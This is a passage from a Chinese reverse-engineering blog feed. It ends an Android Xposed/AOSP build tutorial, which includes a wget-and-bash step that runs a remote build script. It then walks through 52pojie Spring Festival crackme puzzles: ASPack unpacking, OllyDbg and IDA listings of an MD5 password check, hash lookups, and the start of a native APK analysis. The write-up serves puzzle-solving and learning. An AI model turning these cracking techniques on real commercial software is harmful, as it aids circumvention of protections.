src="/pics/Android逆向入门/三/5.png" srcset="/img/loading.gif" alt></p><p>点击后勾选我们编写的模块，并在 Framework 界面点击 Soft Reboot 以激活插件：</p><p><img src="/pics/Android逆向入门/三/6.png" srcset="/img/loading.gif" alt></p><p>重启后系统部分颜色同样被改变，但效果没有 Cydia 的好：</p><p><img src="/pics/Android逆向入门/三/7.png" srcset="/img/loading.gif" alt></p><h3 id="classLoader"><a href="#classLoader" class="headerlink" title="classLoader"></a>classLoader</h3><p>与 Java 上的类似，就是一个类装载器。与 Java 不同的是，classLoader 所加载的就是 dex 文件本身。所以通过程序的 classLoader，可以取得程序的 dex 中所定义的所有类及其成员函数。同理，如果一个程序有多个 dex，那么会对应着多个 classLoader，特别是使用动态加载的 dex，则需要传递想要的 classLoader 才可以进行数据获取。</p><h1 id="Android-源码浅析"><a href="#Android-源码浅析" class="headerlink" title="Android 源码浅析"></a>Android 源码浅析</h1><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>Ubuntu 14.04</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>首先搭建好 JDK 6 的环境：</p><pre><code class="bash">cd &amp;&amp; wget https://repo.huaweicloud.com/java/jdk/6u45-b06/jdk-6u45-linux-x64.binchmod +x jdk-6u45-linux-x64.bin &amp;&amp; ./jdk-6u45-linux-x64.bincd /usr &amp;&amp; sudo mkdir javacd java &amp;&amp; sudo mv ~/jdk1.6.0_45 .vim ~/.bashrc# export JAVA_HOME=&quot;/usr/java/jdk1.6.0_45&quot;# export JRE_HOME=&quot;$JAVA_HOME/jre&quot;# export CLASSPATH=&quot;$CLASSPATH:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar&quot;# export PATH=&quot;$PATH:$JAVA_HOME/bin&quot;source ~/.bashrcjava -version</code></pre><p>然后安装一些编译时需要用到的依赖文件：</p><pre><code class="bash">sudo apt-get updatesudo apt-get install git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev ccache libgl1-mesa-dev libxml2-utils xsltproc unzip</code></pre><p>添加 51-android.rules，使得手机 USB 连接到 Ubuntu 能够被识别：</p><pre><code class="bash">cd &amp;&amp; wget https://raw.githubusercontent.com/M0Rf30/android-udev-rules/master/51-android.rulessudo mv 51-android.rules /etc/udev/rules.d/sudo udevadm control --reload-rules</code></pre><p>接下来使用 repo 工具同步下载 Android 源码：</p><pre><code class="bash">cd &amp;&amp; mkdir bin # export PATH=&quot;$HOME/bin:$PATH&quot;curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/bin/repo# curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repochmod a+x ~/bin/repoexport WORKING_DIRECTORY=&quot;android-4.4.3_r1&quot;mkdir $WORKING_DIRECTORY &amp;&amp; cd $WORKING_DIRECTORYgit config --global user.name &quot;Your Name&quot;git config --global user.email &quot;your@example.com&quot;# export REPO_URL=&quot;https://aosp.tuna.tsinghua.edu.cn/android/git-repo&quot;# vim ~/bin/repo # REPO_URL = &#39;https://aosp.tuna.tsinghua.edu.cn/android/git-repo&#39;repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-4.4.3_r1# repo init -u https://android.googlesource.com/platform/manifest -b android-4.4.3_r1repo sync # Takes a very long time# repo sync -c --no-clone-bundle --no-tags --prune -j4</code></pre><p>同步完成后进行编译：</p><pre><code class="bash">source build/envsetup.sh # Setup environmentlunch aosp_arm-eng # Setup choicesexport USE_CCACHE=1 # Enable ccacheprebuilts/misc/linux-x86/ccache/ccache -M 100G # Set ccache memory = 100G# export CCACHE_DIR=$YOUR_PATH/.ccache # Set ccache dir # Default in $HOME/.ccachemake -j4</code></pre><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>安装一下 Android Studio，用来作为查看源码的编辑器：</p><pre><code class="bash">sudo apt-get updatesudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 lib32z1 libbz2-1.0:i386wget https://dl.google.com/dl/android/studio/ide-zips/3.5.3.0/android-studio-ide-191.6010548-linux.tar.gztar zxvf android-studio-ide-191.6010548-linux.tar.gzsudo mv android-studio /usr/localcd /usr/local/android-studio/bin./studio.sh</code></pre><p>PS：<a href="https://www.v2ex.com/t/455266" target="_blank" rel="noopener">谷歌在国内有服务器，用 ping.chinaz.com 解析出 dl.google.com 最快的 ip，在 hosts 里写死就行了，直接满速下载。</a></p><p>生成 Android Studio 文件：</p><pre><code class="bash">cd $HOME/$WORKING_DIRECTORY &amp;&amp; source build/envsetup.shlunch aosp_arm-engcd development/tools/idegen &amp;&amp; mmcd $HOME/$WORKING_DIRECTORY &amp;&amp; ./development/tools/idegen/idegen.sh</code></pre><p>运行完后，将根目录下的 android.ipr 导入 Android Studio 即可。目录结构：</p><table><thead><tr><th style="text-align:center">文件夹/文件</th><th style="text-align:center">包含内容</th></tr></thead><tbody><tr><td style="text-align:center">abi</td></tr><tr><td style="text-align:center">art</td><td style="text-align:center">art 模式相关的代码</td></tr><tr><td style="text-align:center">bionic</td><td style="text-align:center">各种 so 库的源代码</td></tr><tr><td style="text-align:center">bootable</td><td style="text-align:center">recovery、bootloader、diskinstaller</td></tr><tr><td style="text-align:center">build</td><td style="text-align:center">源码编译生成的规则代码</td></tr><tr><td style="text-align:center">cts</td><td style="text-align:center">Android 兼容性测试套件标准</td></tr><tr><td style="text-align:center">dalvik</td><td style="text-align:center">Dalvik 模式相关的代码</td></tr><tr><td style="text-align:center">developers</td><td style="text-align:center">一些开发上用来参考的资料</td></tr><tr><td style="text-align:center">development</td><td style="text-align:center">Android 开发相关的代码，makekey 等</td></tr><tr><td style="text-align:center">device</td><td style="text-align:center">手机驱动的源码</td></tr><tr><td style="text-align:center">docs</td><td style="text-align:center">doc 文档</td></tr><tr><td style="text-align:center">external</td><td style="text-align:center">Android 使用的一些开源的模块</td></tr><tr><td style="text-align:center">frameworks</td><td style="text-align:center">框架</td></tr><tr><td style="text-align:center">hardware</td><td style="text-align:center">部分开源的 HAL 代码</td></tr><tr><td style="text-align:center">libcore</td><td style="text-align:center">一些核心的 lib 文件库</td></tr><tr><td style="text-align:center">libnativehelper</td><td style="text-align:center">jni 相关的代码，包括如何通过 jni 来获取 Dalvik 中的某些函数</td></tr><tr><td style="text-align:center">Makefile</td></tr><tr><td style="text-align:center">ndk</td><td style="text-align:center">ndk 代码</td></tr><tr><td style="text-align:center">out</td></tr><tr><td style="text-align:center">packages</td><td style="text-align:center">应用程序源码</td></tr><tr><td style="text-align:center">pdk</td></tr><tr><td style="text-align:center">prebuilts</td><td style="text-align:center">镜像生成依赖的一些文件，如 gcc、kernel 等</td></tr><tr><td style="text-align:center">sdk</td><td style="text-align:center">sdk 源码，模拟器源码</td></tr><tr><td style="text-align:center">system</td><td style="text-align:center">底层文件系统库、应用及组件（C 语言）</td></tr><tr><td style="text-align:center">tools</td></tr></tbody></table><h2 id="内核代码"><a href="#内核代码" class="headerlink" title="内核代码"></a>内核代码</h2><p>编译内核代码</p><pre><code class="bash">git clone https://aosp.tuna.tsinghua.edu.cn/kernel/msm# git clone https://android.googlesource.com/kernel/msmcd msmgit branch -agit checkout remotes/origin/android-msm-hammerhead-3.4-kitkat-mr1sudo -i # 在root下进行编译export PATH=&quot;$PATH:$WORKING_DIRECTORY/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6/bin&quot;export ARCH=armexport SUBARCH=armexport CROSS_COMPILE=arm-eabi-make hammerhead_defconfigmake -j4</code></pre><p>完成后将输出的 zImage-dtb 文件覆盖到之前的安卓源码中。重新编译手机镜像：</p><pre><code class="bash">source build/envsetup.shlunch aosp_hammerhead-userdebugmake -j4</code></pre><p>刷机：</p><pre><code>adb reboot bootloaderfastboot -w flashall</code></pre><table><thead><tr><th style="text-align:center">编译命令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">m</td><td style="text-align:center">编译所有的模块</td></tr><tr><td style="text-align:center">mm</td><td style="text-align:center">编译当前目录下的模块，当前目录下要有 Android.mk 文件</td></tr><tr><td style="text-align:center">mmm</td><td style="text-align:center">编译指定路径下的模块，指定路径下要有 Android.mk 文件</td></tr><tr><td style="text-align:center">make snod</td><td style="text-align:center">部分编译完后，使用该命令来编译的结果整合到镜像中</td></tr></tbody></table><h2 id="使用-Docker-进行编译-Android-源码"><a href="#使用-Docker-进行编译-Android-源码" class="headerlink" title="使用 Docker 进行编译 Android 源码"></a>使用 Docker 进行编译 Android 源码</h2><p>源码编译的时候在不同环境中可能会有不同的问题，但在有了 docker 之后，环境的问题就可以很轻松地解决了。命令如下：</p><pre><code class="bash">cd &amp;&amp; mkdir buildexport AOSP_VOL=&quot;$HOME/build&quot;wget https://raw.githubusercontent.com/tiann/docker-aosp/master/tests/build-kitkat.sh # 连接不上的话改一下hostsbash build-kitkat.sh</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://source.android.com/setup?hl=en" target="_blank" rel="noopener">https://source.android.com/setup?hl=en</a><br><a href="https://jingyan.baidu.com/article/d621e8dae805272865913fa7.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/d621e8dae805272865913fa7.html</a><br><a href="https://www.cnblogs.com/yyangblog/archive/2011/03/02/1968880.html" target="_blank" rel="noopener">https://www.cnblogs.com/yyangblog/archive/2011/03/02/1968880.html</a><br><a href="https://blog.csdn.net/u012417380/article/details/72809141" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/72809141</a><br><a href="https://blog.csdn.net/u012417380/article/details/73196722" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/73196722</a><br><a href="https://blog.csdn.net/u012417380/article/details/73353670" target="_blank" rel="noopener">https://blog.csdn.net/u012417380/article/details/73353670</a><br><a href="https://blog.csdn.net/sergeycao/article/details/46459419" target="_blank" rel="noopener">https://blog.csdn.net/sergeycao/article/details/46459419</a><br><a href="https://www.jianshu.com/p/3bdf6e9f9dfe" target="_blank" rel="noopener">https://www.jianshu.com/p/3bdf6e9f9dfe</a><br><a href="http://shxi.me/posts/7b82cd68.html" target="_blank" rel="noopener">http://shxi.me/posts/7b82cd68.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>2020春节-吾爱破解解题领红包活动</title>
    <link href="blog.b3ale.cn/2020/02/11/%5BTODO%5D2020%E6%98%A5%E8%8A%82-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/"/>
    <id>blog.b3ale.cn/2020/02/11/%5BTODO%5D2020%E6%98%A5%E8%8A%82-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/</id>
    <published>2020-02-11T03:37:58.000Z</published>
    <updated>2020-03-19T15:28:22.099Z</updated>
    
    <content type="html"><![CDATA[<p>第二次参加领红包活动，这次有两题是 apk。</p><a id="more"></a><h1 id="【春节】解题领红包之一"><a href="#【春节】解题领红包之一" class="headerlink" title="【春节】解题领红包之一"></a>【春节】解题领红包之一</h1><p>公众号回复直接得到口令：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/1.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之二"><a href="#【春节】解题领红包之二" class="headerlink" title="【春节】解题领红包之二"></a>【春节】解题领红包之二</h1><p>查壳发现有 ASPack 壳，直接上 ESP 定律把壳脱掉：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/2.png" srcset="/img/loading.gif" alt></p><p>然后用 OD 看一下 dump 下来的程序，先搜索字符串，可以看到输入正确后返回的字符串：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/3.png" srcset="/img/loading.gif" alt></p><p>然后定位到具体的函数位置，看下来感觉有点复杂，但大概可以看到涉及到了三个字符串，可以判断出是类似 MD5 的哈希摘要：</p><pre><code>00617D34   .  8D4D F0       LEA ECX,DWORD PTR SS:[EBP-0x10]00617D37   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC00617D3D   .  8B12          MOV EDX,DWORD PTR DS:[EDX]00617D3F   .  8D45 FC       LEA EAX,DWORD PTR SS:[EBP-0x4]00617D42   .  E8 597DE1FF   CALL dumped_.0042FAA000617D47   .  8B45 F0       MOV EAX,DWORD PTR SS:[EBP-0x10]00617D4A   .  BA B87E6100   MOV EDX,dumped_.00617EB8          ;  E7EE5F4653E31955CACC7CD68E2A783900617D4F   .  E8 A42DDFFF   CALL dumped_.0040AAF800617D54   .  0F9445 E7     SETE BYTE PTR SS:[EBP-0x19]00617D58   .  33C0          XOR EAX,EAX00617D5A   .  5A            POP EDX00617D5B   .  59            POP ECX00617D5C   .  59            POP ECX00617D5D   .  64:8910       MOV DWORD PTR FS:[EAX],EDX00617D60   .  68 757D6100   PUSH dumped_.00617D7500617D65   &gt;  8D45 F0       LEA EAX,DWORD PTR SS:[EBP-0x10]00617D68   .  E8 4F1FDFFF   CALL dumped_.00409CBC00617D6D   .  C3            RETN00617D6E   .- E9 6515DFFF   JMP dumped_.004092D800617D73   .^ EB F0         JMP SHORT dumped_.00617D6500617D75   .  807D E7 00    CMP BYTE PTR SS:[EBP-0x19],0x000617D79   .  74 57         JE SHORT dumped_.00617DD200617D7B   .  33C0          XOR EAX,EAX00617D7D   .  55            PUSH EBP00617D7E   .  68 CB7D6100   PUSH dumped_.00617DCB00617D83   .  64:FF30       PUSH DWORD PTR FS:[EAX]00617D86   .  64:8920       MOV DWORD PTR FS:[EAX],ESP00617D89   .  8D45 EC       LEA EAX,DWORD PTR SS:[EBP-0x14]00617D8C   .  E8 2B1FDFFF   CALL dumped_.00409CBC00617D91   .  8D4D EC       LEA ECX,DWORD PTR SS:[EBP-0x14]00617D94   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC00617D9A   .  8B12          MOV EDX,DWORD PTR DS:[EDX]00617D9C   .  8D45 F8       LEA EAX,DWORD PTR SS:[EBP-0x8]00617D9F   .  E8 7C7CE1FF   CALL dumped_.0042FA2000617DA4   .  8B45 EC       MOV EAX,DWORD PTR SS:[EBP-0x14]00617DA7   .  BA 087F6100   MOV EDX,dumped_.00617F08          ;  ea6b2efbdd4255a9f1b3bbc6399b58f400617DAC   .  E8 472DDFFF   CALL dumped_.0040AAF800617DB1   .  0F9445 E6     SETE BYTE PTR SS:[EBP-0x1A]00617DB5   .  33C0          XOR EAX,EAX00617DB7   .  5A            POP EDX00617DB8   .  59            POP ECX00617DB9   .  59            POP ECX00617DBA   .  64:8910       MOV DWORD PTR FS:[EAX],EDX00617DBD   .  68 D67D6100   PUSH dumped_.00617DD600617DC2   &gt;  8D45 EC       LEA EAX,DWORD PTR SS:[EBP-0x14]00617DC5   .  E8 F21EDFFF   CALL dumped_.00409CBC00617DCA   .  C3            RETN00617DCB   .- E9 0815DFFF   JMP dumped_.004092D800617DD0   .^ EB F0         JMP SHORT dumped_.00617DC200617DD2   &gt;  C645 E6 00    MOV BYTE PTR SS:[EBP-0x1A],0x000617DD6   .  807D E6 00    CMP BYTE PTR SS:[EBP-0x1A],0x000617DDA   .  74 6D         JE SHORT dumped_.00617E4900617DDC   .  33C0          XOR EAX,EAX00617DDE   .  55            PUSH EBP00617DDF   .  68 2C7E6100   PUSH dumped_.00617E2C00617DE4   .  64:FF30       PUSH DWORD PTR FS:[EAX]00617DE7   .  64:8920       MOV DWORD PTR FS:[EAX],ESP00617DEA   .  8D45 E8       LEA EAX,DWORD PTR SS:[EBP-0x18]00617DED   .  E8 CA1EDFFF   CALL dumped_.00409CBC00617DF2   .  8D4D E8       LEA ECX,DWORD PTR SS:[EBP-0x18]00617DF5   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC00617DFB   .  8B12          MOV EDX,DWORD PTR DS:[EDX]00617DFD   .  8D45 F4       LEA EAX,DWORD PTR SS:[EBP-0xC]00617E00   .  E8 1B7CE1FF   CALL dumped_.0042FA2000617E05   .  8B45 E8       MOV EAX,DWORD PTR SS:[EBP-0x18]00617E08   .  BA 587F6100   MOV EDX,dumped_.00617F58          ;  c8d46d341bea4fd5bff866a65ff8aea900617E0D   .  E8 E62CDFFF   CALL dumped_.0040AAF800617E12   .  0F9445 E5     SETE BYTE PTR SS:[EBP-0x1B]00617E16   .  33C0          XOR EAX,EAX00617E18   .  5A            POP EDX00617E19   .  59            POP ECX00617E1A   .  59            POP ECX00617E1B   .  64:8910       MOV DWORD PTR FS:[EAX],EDX00617E1E   .  68 337E6100   PUSH dumped_.00617E3300617E23   &gt;  8D45 E8       LEA EAX,DWORD PTR SS:[EBP-0x18]00617E26   .  E8 911EDFFF   CALL dumped_.00409CBC00617E2B   .  C3            RETN00617E2C   .- E9 A714DFFF   JMP dumped_.004092D800617E31   .^ EB F0         JMP SHORT dumped_.00617E2300617E33   .  807D E5 00    CMP BYTE PTR SS:[EBP-0x1B],0x000617E37   .  74 10         JE SHORT dumped_.00617E4900617E39   .  83C9 FF       OR ECX,-0x100617E3C   .  83CA FF       OR EDX,-0x100617E3F   .  B8 A87F6100   MOV EAX,dumped_.00617FA8          ;  请把答案回复到论坛公众号！00617E44   .  E8 236BF5FF   CALL dumped_.0056E96C</code></pre><p>抛弃 OD，把 dump 下来的程序导入 IDA，根据前面找到的 unicode 字符串定位到函数，反编译后得到如下代码：</p><pre><code class="cpp">int __fastcall TForm1_edtPwdChange(int a1){  int v1; // ebx  int v2; // edx  int len; // eax  int md5Handler; // esi  char v5; // zf  unsigned int v7; // [esp-18h] [ebp-58h]  int *v8; // [esp-14h] [ebp-54h]  char *v9; // [esp-10h] [ebp-50h]  unsigned int v10; // [esp-Ch] [ebp-4Ch]  void *v11; // [esp-8h] [ebp-48h]  int *v12; // [esp-4h] [ebp-44h]  int v13; // [esp+8h] [ebp-38h]  int v14; // [esp+Ch] [ebp-34h]  int v15; // [esp+10h] [ebp-30h]  int v16; // [esp+14h] [ebp-2Ch]  int v17; // [esp+18h] [ebp-28h]  int v18; // [esp+1Ch] [ebp-24h]  int v19; // [esp+20h] [ebp-20h]  char v20; // [esp+25h] [ebp-1Bh]  char v21; // [esp+26h] [ebp-1Ah]  char v22; // [esp+27h] [ebp-19h]  char *string3; // [esp+28h] [ebp-18h]  char *string2; // [esp+2Ch] [ebp-14h]  char *string1; // [esp+30h] [ebp-10h]  char s3; // [esp+34h] [ebp-Ch]  char s2; // [esp+38h] [ebp-8h]  char s1; // [esp+3Ch] [ebp-4h]  int savedregs; // [esp+40h] [ebp+0h]  v1 = a1;  v12 = &amp;savedregs;  v11 = &amp;loc_617E9C;  v10 = __readfsdword(0);  __writefsdword(0, (unsigned int)&amp;v10);  sub_541DB8(*(Controls::TControl **)(a1 + 976), &amp;v19);  len = v19;  if ( v19 )    len = *(_DWORD *)(v19 - 4);  if ( len == 15 )                              // input&#39;s length should be 15  {    LOBYTE(v2) = 1;    md5Handler = sub_616B84(&amp;cls_IdHashMessageDigest_TIdHashMessageDigest5, v2);// get MD5 handler    v9 = &amp;s1;    sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v17);    sub_50F2EC(v17, 7, &amp;v18);    registerFunc(md5Handler, v18, 0, (int)&amp;s1);    v9 = &amp;s2;    v8 = &amp;v16;    sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v15);    Compprod::TComponentsPageProducer::HandleTag(&amp;v16);    registerFunc(md5Handler, v16, 0, (int)&amp;s2);    v9 = &amp;s3;    sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v13);    unknown_libname_807(v13, 4, &amp;v14);    registerFunc(md5Handler, v14, 0, (int)&amp;s3);    v9 = (char *)&amp;savedregs;    v8 = (int *)&amp;loc_617D6E;    v7 = __readfsdword(0);    __writefsdword(0, (unsigned int)&amp;v7);    freeMem(&amp;string1);    sub_42FAA0((int *)&amp;s1, 0, (int *)&amp;string1);    compareStr(string1, (char *)L&quot;E7EE5F4653E31955CACC7CD68E2A7839&quot;);// compare string1    v22 = v5;    __writefsdword(0, v7);    v9 = (char *)&amp;loc_617D75;    freeMem(&amp;string1);    if ( v22 )    {      v9 = (char *)&amp;savedregs;      v8 = (int *)&amp;loc_617DCB;      v7 = __readfsdword(0);      __writefsdword(0, (unsigned int)&amp;v7);      freeMem(&amp;string2);      sub_42FA20(&amp;s2, 0, &amp;string2);      compareStr(string2, (char *)L&quot;ea6b2efbdd4255a9f1b3bbc6399b58f4&quot;);// compare string2      v21 = v5;      __writefsdword(0, v7);      v9 = (char *)&amp;loc_617DD6;      freeMem(&amp;string2);    }    else    {      v21 = 0;    }    if ( v21 )    {      v9 = (char *)&amp;savedregs;      v8 = (int *)&amp;loc_617E2C;      v7 = __readfsdword(0);      __writefsdword(0, (unsigned int)&amp;v7);      freeMem(&amp;string3);      sub_42FA20(&amp;s3, 0, &amp;string3);      compareStr(string3, (char *)L&quot;c8d46d341bea4fd5bff866a65ff8aea9&quot;);// compare string3      v20 = v5;      __writefsdword(0, v7);      v9 = (char *)&amp;loc_617E33;      freeMem(&amp;string3);      if ( v20 )                                // Success        createDialog((int)L&quot;请把答案回复到论坛公众号！&quot;, -1, -1);    }  }  __writefsdword(0, v10);  v12 = (int *)&amp;loc_617EA3;  freeMem(&amp;v13);  freeMem(&amp;v14);  freeMem(&amp;v15);  freeMem(&amp;v16);  freeMem(&amp;v17);  freeMem(&amp;v18);  freeMem(&amp;v19);  return sub_409D1C(&amp;string3, 6);}</code></pre><p>反编译后的代码也比较含糊，但可以猜到，输入的字符串长度为 15，字符串被分成了 3 部分，每部分分别进行 MD5 哈希，并与内存中的字符串进行比较，字符串正确就会弹出一个正确的对话窗口。MD5 在理论上是不可逆的，但可以在通过搜索引擎查找网上已经被爆破出的对应的明文。第一部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/4.png" srcset="/img/loading.gif" alt></p><p>第二部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/5.png" srcset="/img/loading.gif" alt></p><p>第三部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/6.png" srcset="/img/loading.gif" alt></p><p>将得到的字符串拼接并进行验证：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/7.png" srcset="/img/loading.gif" alt></p><p>回复公众号得到口令</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/8.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之三"><a href="#【春节】解题领红包之三" class="headerlink" title="【春节】解题领红包之三"></a>【春节】解题领红包之三</h1><p>这题给的是一个 apk，先使用 jdax 打开，查看程序入口点 MainActivity，得到如下代码：</p><pre><code class="java">package com.wuaipojie.crackme01;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity implements OnClickListener {    private Button btn_click;    private EditText editText;    private native boolean checkFlag(String str);    public native void onClick(View view);    static {        /* JADX: method processing error *//*Error: java.lang.NullPointerException    at jadx.core.dex.visitors.regions.ProcessTryCatchRegions.searchTryCatchDominators(ProcessTryCatchRegions.java:75)    at jadx.core.dex.visitors.regions.ProcessTryCatchRegions.process(ProcessTryCatchRegions.java:45)    at jadx.core.dex.visitors.regions.RegionMakerVisitor.postProcessRegions(RegionMakerVisitor.java:63)    at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:58)    at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)    at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)    at jadx.core.ProcessClass.process(ProcessClass.java:37)    at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:280)    at jadx.api.JavaClass.decompile(JavaClass.java:62)*/        /*        r0 = &quot;crack_j2c&quot;;     Catch:{ UnsatisfiedLinkError -&gt; 0x0005 }        java.lang.System.loadLibrary(r0);     Catch:{ UnsatisfiedLinkError -&gt; 0x0005 }    L_0x0005:        return;        */        throw new UnsupportedOperationException(&quot;Method not decompiled: com.wuaipojie.crackme01.MainActivity.&lt;clinit&gt;():void&quot;);    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.editText = (EditText) findViewById(R.id.input_flag);        Button button = (Button) findViewById(R.id.button);        this.btn_click = button;        button.setOnClickListener(this);    }}</code></pre><p>主要有三个函数，<code>onCreate()</code> 在 Java 层中实现，可以看出整个界面中有一个文本框和一个按钮，并设置了一个按钮的监听事件，即 onClick；<code>onClick()</code> 和 <code>checkFlag()</code> 可以看到是在 Native 层进行实现的，可以从 lib 文件夹中找到 so 文件，接下来用 IDA 对 so 中的两个函数进行分析。导入 IDA 后，通过函数名可以看出两个函数通过静态注册：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/9.png" srcset="/img/loading.gif" alt></p><p>然后先来看 onClick 函数。这边略过一些导入 jni.h 等一些分析的过程（一般静态注册函数的第一个参数是 JNIEnv 等等），在分析的过程中大致猜测出两个函数 <code>sub_5288</code> 和 <code>sub_539C</code> 两个函数分别用来获取指定的方法（getMethod）或者是域（getField）。接下来直接来看分析过后的代码：</p><pre><code class="cpp">int __fastcall Java_com_wuaipojie_crackme01_MainActivity_onClick__Landroid_view_View_2(_JNIEnv *env, int a2, int a3){  _JNIEnv *env_; // r4  int v4; // r5  int v5; // r9  int v6; // r0  int v7; // r5  jstring (__cdecl *v8)(JNIEnv *, const char *); // r2  int v9; // r6  int v10; // r8  int v11; // r6  int v12; // r8  int len; // r5  int v14; // r5  const char *v15; // r1  int v16; // r6  int v17; // r5  int result; // r0  JNINativeMethod method; // [sp+4h] [bp-74h]  int v20; // [sp+10h] [bp-68h]  int v21; // [sp+14h] [bp-64h]  int v22; // [sp+18h] [bp-60h]  int v23; // [sp+1Ch] [bp-5Ch]  int v24; // [sp+20h] [bp-58h]  int v25; // [sp+24h] [bp-54h]  int a3a; // [sp+28h] [bp-50h]  int v27; // [sp+2Ch] [bp-4Ch]  int v28; // [sp+30h] [bp-48h]  int v29; // [sp+34h] [bp-44h]  int v30; // [sp+38h] [bp-40h]  int a2a; // [sp+3Ch] [bp-3Ch]  int v32; // [sp+40h] [bp-38h]  int v33; // [sp+48h] [bp-30h]  int v34; // [sp+50h] [bp-28h]  int v35; // [sp+58h] [bp-20h]  env_ = env;  v4 = a3;  a2a = 0;  v29 = 0;  v30 = 0;  v27 = 0;  v28 = 0;  v25 = 0;  a3a = 0;  v23 = 0;  v24 = 0;  v21 = 0;  v22 = 0;  method.fnPtr = 0;  v20 = 0;  v5 = ((int (__fastcall *)(_JNIEnv *, int))env-&gt;functions-&gt;NewLocalRef)(env, a2);  v6 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;NewLocalRef)(env_, v4);  if ( !v5 )    goto LABEL_38;  v7 = v6;  method.name = &quot;editText&quot;;  method.signature = &quot;Landroid/widget/EditText;&quot;;  if ( getFields(env_, &amp;a2a, &amp;a3a, 0, &quot;com/wuaipojie/crackme01/MainActivity&quot;, method) )    goto LABEL_39;  v9 = ((int (__fastcall *)(_JNIEnv *, int, int))env_-&gt;functions-&gt;GetObjectField)(env_, v5, a3a);  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  if ( v7 )    ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v7);  if ( !v9 )    goto LABEL_38;  if ( !v25 )  {    method.name = &quot;getText&quot;;    method.signature = &quot;()Landroid/text/Editable;&quot;;    if ( getMethods(env_, &amp;v30, &amp;v25, 0, &quot;android/widget/EditText&quot;, method) )      goto LABEL_39;  }  v10 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v9);// get input string  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v9);  if ( !v10 )    goto LABEL_38;  if ( !v24 )  {    method.name = &quot;toString&quot;;    method.signature = &quot;()Ljava/lang/String;&quot;;    if ( getMethods(env_, &amp;v29, &amp;v24, 0, &quot;java/lang/Object&quot;, method) )      goto LABEL_39;  }  v11 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v10);// convert object to string  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v10);  if ( !v11 )    goto LABEL_38;  if ( !v23 )  {    method.name = &quot;trim&quot;;    method.signature = &quot;()Ljava/lang/String;&quot;;    if ( getMethods(env_, &amp;v28, &amp;v23, 0, &quot;java/lang/String&quot;, method) )      goto LABEL_39;  }  v12 = ((int (__fastcall *)(_JNIEnv *, 